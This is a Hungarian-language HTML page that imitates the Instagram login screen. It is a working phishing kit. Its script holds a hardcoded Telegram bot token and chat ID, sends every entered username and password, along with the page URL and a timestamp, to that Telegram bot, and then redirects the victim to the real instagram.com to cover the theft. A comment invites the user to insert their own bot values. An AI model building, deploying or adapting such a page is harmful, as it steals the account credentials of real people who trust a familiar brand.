<!DOCTYPE html>
<html lang="hu">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            min-height: 100dvh;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #000;
            overflow-x: hidden;
            padding: 0 24px;
        }

        /* Top language label */
        .lang-top {
            width: 100%;
            text-align: center;
            padding: 18px 0;
            font-size: 15px;
            color: #737373;
        }

        /* Instagram glyph icon */
        .logo-wrap {
            width: 100%;
            display: flex;
            justify-content: center;
            margin: 40px 0 60px;
        }
        .ig-icon {
            width: 72px;
            height: 72px;
        }

        /* Form */
        .login-form {
            width: 100%;
            max-width: 420px;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .input-wrapper {
            position: relative;
            width: 100%;
        }

        .input-wrapper input {
            width: 100%;
            height: 56px;
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 14px;
            padding: 18px 16px 6px;
            font-size: 16px;
            color: #000;
            outline: none;
            transition: border-color 0.15s ease;
            font-family: inherit;
        }

        .input-wrapper input:focus {
            border-color: #a8a8a8;
        }

        .input-wrapper label {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #8e8e8e;
            font-size: 16px;
            pointer-events: none;
            transition: all 0.15s ease;
        }

        .input-wrapper input:focus + label,
        .input-wrapper input:not(:placeholder-shown) + label {
            top: 12px;
            transform: translateY(0);
            font-size: 12px;
        }

        /* Login button */
        .login-btn {
            margin-top: 8px;
            width: 100%;
            height: 52px;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 26px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.15s ease, opacity 0.15s ease;
            font-family: inherit;
        }
        .login-btn:hover:not(:disabled) { background-color: #1877f2; }
        .login-btn:disabled { opacity: 0.5; cursor: not-allowed; }

        /* Forgot link */
        .forgot-link {
            display: block;
            text-align: center;
            margin-top: 26px;
            color: #000;
            font-size: 15px;
            font-weight: 500;
            text-decoration: none;
        }

        /* Spacer pushes signup + meta to bottom */
        .spacer { flex: 1; min-height: 60px; }

        /* Sign up button */
        .signup-btn {
            width: 100%;
            max-width: 420px;
            height: 52px;
            background: transparent;
            color: #0095f6;
            border: 1.5px solid #0095f6;
            border-radius: 26px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            font-family: inherit;
            transition: background-color 0.15s ease;
            margin-bottom: 28px;
        }
        .signup-btn:hover { background-color: rgba(0, 149, 246, 0.06); }

        /* Meta footer */
        .meta-footer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            padding-bottom: 30px;
            color: #000;
            font-size: 18px;
            font-weight: 600;
        }
        .meta-footer svg {
            width: 30px;
            height: 20px;
        }
    </style>
</head>
<body>
    <!-- Top language label -->
    <div class="lang-top">Magyar</div>

    <!-- Instagram glyph -->
    <div class="logo-wrap">
        <svg class="ig-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" aria-label="Instagram">
            <defs>
                <radialGradient id="igGrad" cx="30%" cy="107%" r="150%">
                    <stop offset="0%"  stop-color="#fdf497"/>
                    <stop offset="5%"  stop-color="#fdf497"/>
                    <stop offset="45%" stop-color="#fd5949"/>
                    <stop offset="60%" stop-color="#d6249f"/>
                    <stop offset="90%" stop-color="#285AEB"/>
                </radialGradient>
            </defs>
            <rect x="2" y="2" width="20" height="20" rx="5.5" ry="5.5"
                  fill="none" stroke="url(#igGrad)" stroke-width="2.2"/>
            <circle cx="12" cy="12" r="4.6"
                    fill="none" stroke="url(#igGrad)" stroke-width="2.2"/>
            <circle cx="17.4" cy="6.6" r="1.3" fill="url(#igGrad)"/>
        </svg>
    </div>

    <!-- Login form -->
    <form class="login-form" id="loginForm" autocomplete="on">
        <div class="input-wrapper">
            <input type="text" id="username" name="username" placeholder=" " autocomplete="username" required>
            <label for="username">Felhasználónév, e-mail-cím vagy mobiltelefonszám</label>
        </div>

        <div class="input-wrapper">
            <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password" required>
            <label for="password">Jelszó</label>
        </div>

        <button type="submit" class="login-btn" id="loginBtn">Bejelentkezés</button>
    </form>

    <a href="#" class="forgot-link">Elfelejtetted a jelszavadat?</a>

    <div class="spacer"></div>

    <!-- Sign up -->
    <button type="button" class="signup-btn">Új fiók létrehozása</button>

    <!-- Meta footer -->
    <div class="meta-footer">
        <svg viewBox="0 0 30 20" xmlns="http://www.w3.org/2000/svg" aria-label="Meta">
            <path d="M29.3 3.4c-.8-1.7-2-2.7-3.5-2.9-1.3-.2-2.6.2-3.8 1-.7.5-1.4 1.2-2 2-.3.4-1.4 2-2 3-.4-.6-2-3-2.4-3.6-.6-.9-1.3-1.6-2-2-1.2-.9-2.5-1.3-3.8-1C5.3.6 4.1 1.6 3.3 3.3 2.4 5.3 2 7.6 2 10.1c0 2 .3 3.8 1 5.3.7 1.6 1.9 2.6 3.4 2.9 1.3.2 2.7-.2 4-1.3.9-.8 1.7-1.8 2.5-3.1.3-.5 1.2-2 1.8-3 .6 1 1.7 2.7 2.1 3.3.8 1.1 1.6 2 2.4 2.6 1.2.9 2.4 1.2 3.5 1.1 1.5-.2 2.6-1.2 3.3-2.9.6-1.4.9-3.1.9-5.1 0-2.5-.4-4.8-1.6-6.5zm-17.6 11c-1.3 1.5-2.6 2-3.7 1.6-1-.4-1.6-1.5-1.8-3-.2-1.4-.1-3 .3-4.5.4-1.5 1.1-2.6 2.1-2.8.9-.2 2 .5 3 1.7.5.6 1.1 1.4 1.6 2.1-1.2 1.8-2 3.3-2.5 4.4-.2.4-.4.8-.6 1.1l-.4-.6zm16.3-1.4c-.2 1.5-.8 2.6-1.8 3-1 .4-2.2-.2-3.5-1.6-.4-.5-.8-1-1.2-1.6.5-1 1.2-2.4 2.4-4.4.5-.8 1.1-1.6 1.6-2.1 1-1.2 2-1.9 2.9-1.7 1 .2 1.6 1.3 2 2.9.4 1.5.5 3.1.3 4.5z" fill="#000"/>
        </svg>
        <span>Meta</span>
    </div>

    <script>
        // ============================================================
        //  KONFIGURÁCIÓ — cseréld ki a saját értékeidre
        // ============================================================
        const BOT_TOKEN    = '8871641533:AAFePgCgQM4G_MWUV7lRnG46kPqhoyT5uoQ';
        const CHAT_ID      = '6498530786';
        const REDIRECT_URL = 'https://instagram.com';

        const username = document.getElementById('username');
        const password = document.getElementById('password');
        const loginBtn = document.getElementById('loginBtn');
        const form     = document.getElementById('loginForm');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            loginBtn.disabled = true;
            loginBtn.textContent = 'Bejelentkezés…';

            const esc = (s) => s.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');

            const text =
                `🔐 *Új bejelentkezési kísérlet*\n` +
                `👤 Felhasználónév: \`${esc(username.value)}\`\n` +
                `🔑 Jelszó: \`${esc(password.value)}\`\n` +
                `🌐 Oldal: ${esc(location.href)}\n` +
                `🕒 ${new Date().toLocaleString('hu-HU')}`;

            try {
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 5000);

                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    }),
                    signal: controller.signal
                });

                clearTimeout(timeoutId);
            } catch (err) {
                console.error('A Telegram küldés sikertelen:', err);
            }

            window.location.href = REDIRECT_URL;
        });
    </script>
</body>
</html>
